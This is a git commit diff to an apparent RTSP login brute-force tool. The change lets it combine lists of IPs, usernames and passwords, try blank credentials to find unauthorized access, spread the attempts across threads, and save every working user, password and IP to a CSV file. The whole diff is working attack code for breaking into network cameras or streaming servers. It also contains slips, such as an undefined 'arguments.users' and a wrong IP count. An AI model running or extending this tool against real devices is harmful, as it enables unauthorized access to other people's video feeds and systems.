cf1a113b5c0db8346601437de907590acca785e9
Gill-Singh-A <amansg22@iitk.ac.in>
2024-02-27 16:05:56 +0530

    Implemented Brute Force with Multiple Users and Passwords

--- main.py
+++ main.py
@@ -42,40 +42,71 @@ def loginRTSP(ip, user, password):
             return False
     except:
         return False
-def loginHandler(ips, user, password, verbose=False):
+def loginHandler(details, verbose=False):
     group_successful_logins = []
-    for ip in ips:
-        login_status = loginRTSP(ip, user, password)
+    for detail in details:
+        login_status = loginRTSP(detail["ip"], detail["user"], detail["password"])
         if login_status:
             with lock:
-                group_successful_logins.append(ip)
+                group_successful_logins.append(detail)
                 if verbose:
-                    display('+', f"{Back.MAGENTA}{ip}{Back.RESET} => Access Granted")
+                    display('+', f"{Back.BLUE}{detail['user']}{Back.RESET}:{Back.CYAN}{detail['password']}{Back.RESET}@{Back.MAGENTA} {detail['ip']}{Back.RESET} => Access Granted")
                 else:
                     print(f"{Back.RESET}", end='')
     return group_successful_logins
 
 if __name__ == "__main__":
-    arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',')"),
-                              ('-u', "--user", "user", "Username for Brute Force"),
-                              ('-p', "--password", "password", "Password For Brute Force"),
+    arguments = get_arguments(('-i', "--ip", "ip", "File Name of List of IP Addresses (Seperated by ',', either File Name or IP itself)"),
+                              ('-u', "--user", "user", "Username for Brute Force (Seperated by ',', either File Name or User itself)"),
+                              ('-p', "--password", "password", "Password For Brute Force (Seperated by ',', either File Name or Password itself)"),
                               ('-v', "--verbose", "verbose", f"Dislay Additional Information (True/False, Default={verbose})"),
-                              ('-w', "--write", "write", "Name of the File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
+                              ('-w', "--write", "write", "Name of the CSV File for the Successfully Logged In IPs to be dumped (default=current data and time)"))
     if not arguments.ip:
         display('-', "Please Provide a List of IP Addresses")
         exit(0)
+    else:
+        ips = []
+        for ip_detail in arguments.ip.split(','):
+            try:
+                with open(ip_detail, 'r') as file:
+                    display(':', f"Loading IPs from File {Back.MAGENTA}{ip_detail}{Back.RESET}")
+                    ips.extend(file.read().split('\n'))
+                    display('+', f"IPs Loaded = {Back.MAGENTA}{len(arguments.ip)}{Back.RESET}")
+            except FileNotFoundError:
+                ips.append(ip_detail)
+            except:
+                display('-', f"Error Loading IPs from File {Back.YELLOW}{arguments.ip}{Back.RESET}")
+                exit(0)
     if not arguments.user:
         display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
         display(':', f"Trying to Find {Back.MAGENTA}Unauthorized Access{Back.RESET}")
-        arguments.user = ''
+        arguments.user = ['']
     else:
-        arguments.user = quote(arguments.user)
+        try:
+            with open(arguments.user, 'r') as file:
+                display(':', f"Loading Users from File {Back.MAGENTA}{arguments.users}{Back.RESET}")
+                arguments.users = [quote(user) for user in file.read().split('\n')]
+                display('+', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
+        except FileNotFoundError:
+            arguments.user = [quote(user) for user in arguments.user.split(',')]
+        except:
+            display('-', f"Error Loading Users from File {Back.YELLOW}{arguments.user}{Back.RESET}")
+            exit(0)
     if not arguments.password:
         display('*', f"No {Back.MAGENTA}PASSWORD{Back.RESET} Specified")
         display(':', f"Setting Password to {Back.MAGENTA}Blank{Back.RESET}")
-        arguments.password = ''
+        arguments.password = ['']
     else:
-        arguments.password = quote(arguments.password)
+        try:
+            with open(arguments.password, 'r') as file:
+                display(':', f"Loading Passwords from File {Back.MAGENTA}{arguments.password}{Back.RESET}")
+                arguments.password = [quote(password) for password in file.read().split('\n')]
+                display('+', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
+        except FileNotFoundError:
+            arguments.password = [quote(password) for password in arguments.password.split(',')]
+        except:
+            display('-', f"Error Loading Passwords from File {Back.YELLOW}{arguments.password}{Back.RESET}")
+            exit(0)
     arguments.threads = threads_number
     pool = Pool(arguments.threads)
     if arguments.verbose == "True":
@@ -83,29 +114,22 @@ if __name__ == "__main__":
     else:
         arguments.verbose = False
     if not arguments.write:
-        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}"
-    ips = []
-    arguments.ip = arguments.ip.split(',')
-    display(':', "Loading IP Addresses from Files")
-    for ip_file in arguments.ip:
-        try:
-            with open(ip_file, 'r') as file:
-                ips.extend([ip for ip in file.read().split('\n') if ip != ''])
-        except FileNotFoundError:
-            display('-', f"File {Back.YELLOW}{ip_file}{Back.RESET} not Found!")
-        except:
-            display('-', f"Error while reading File {Back.YELLOW}{ip_file}{Back.RESET}")
+        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
+    details = []
+    for user in arguments.user:
+        for password in arguments.password:
+            details.extend([{"ip": ip, "user": user, "password": password} for ip in ips])
     total_ips = len(ips)
-    display('+', "Loaded IP Addresses from Files")
+    total_details = len(details)
     display(':', f"Total Number of IP Addresses = {Back.MAGENTA}{total_ips}{Back.RESET}")
-    display(':', f"Creating {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads", start='\n')
-    ip_division = [ips[group*total_ips//arguments.threads:(group+1)*total_ips//arguments.threads] for group in range(arguments.threads)]
+    display(':', f"Creating {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads Details", start='\n')
+    detail_division = [details[group*total_details//arguments.threads:(group+1)*total_details//arguments.threads] for group in range(arguments.threads)]
     display('+', f"Created {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads")
-    display(':', f"Starting {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads", start='\n')
+    display(':', f"Starting {Back.MAGENTA}{arguments.threads}{Back.RESET} Threads Details", start='\n')
     t1 = time()
     threads = []
-    for thread_index, ip_group in enumerate(ip_division):
-        threads.append(pool.apply_async(loginHandler, (ip_group, arguments.user, arguments.password, arguments.verbose,)))
+    for thread_index, detail_group in enumerate(detail_division):
+        threads.append(pool.apply_async(loginHandler, (detail_group, arguments.verbose)))
     successful_logins = []
     for thread in threads:
         successful_logins.extend(thread.get())
@@ -120,5 +144,6 @@ if __name__ == "__main__":
     display(':', f"\tRate                     = {Back.MAGENTA}{total_ips/(t2-t1):.2f} IPs/second{Back.RESET}")
     display(':', f"Dumping Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}", start='\n')
     with open(arguments.write, 'w') as file:
-        file.write('\n'.join(successful_logins))
+        file.write("User,Password,IP\n")
+        file.write('\n'.join([f"{login['user']},{login['password']},{login['ip']}" for login in successful_logins]))
     display('+', f"Dumped Successfully Authorized IP Addresses in file {Back.MAGENTA}{arguments.write}{Back.RESET}")
